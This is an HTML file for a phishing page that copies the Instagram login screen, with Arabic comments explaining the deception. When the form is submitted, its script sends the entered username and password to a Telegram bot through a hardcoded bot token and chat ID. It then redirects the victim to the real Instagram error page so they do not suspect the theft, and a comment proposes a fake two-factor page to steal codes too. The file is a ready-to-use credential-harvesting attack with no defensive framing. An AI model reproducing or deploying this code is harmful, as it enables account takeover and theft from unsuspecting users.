<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <!-- هنا هنستدعي خطوط وتصميم إنستقرام الجديد -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Wondahs/Instagram-Login-Clone@main/styles/style.css">
</head>
<body>

    <!-- تصميم إنستقرام الجديد (طبق الأصل) -->
    <div class="instagram-login-container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form id="hackForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                    <span class="show-password">Show</span>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider">OR</div>
            <button class="fb-login-btn">Log in with Facebook</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
    </div>

    <script>
        document.getElementById('hackForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            
            // 🔥 إرسال البيانات فوراً لبوت تلجرام
            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
            const CHAT_ID = "2005892579";
            
            const message = `🚨 *INSTAGRAM HIT!*\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\`\n🌐 IP: (Logged via TG)`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            }).then(() => {
                // 💡 الخدعة: بعد ما البيانات تتبعت، نوديه لصفحة "خطأ" عشان ميشكش
                // ممكن نستخدم صفحة 2FA الوهمية عشان ناخد الكود كمان
                window.location.href = "https://www.instagram.com/accounts/login/?error=1";
            }).catch(() => {
                window.location.href = "https://www.instagram.com/accounts/login/?error=1";
            });
        });
    </script>
</body>
</html>
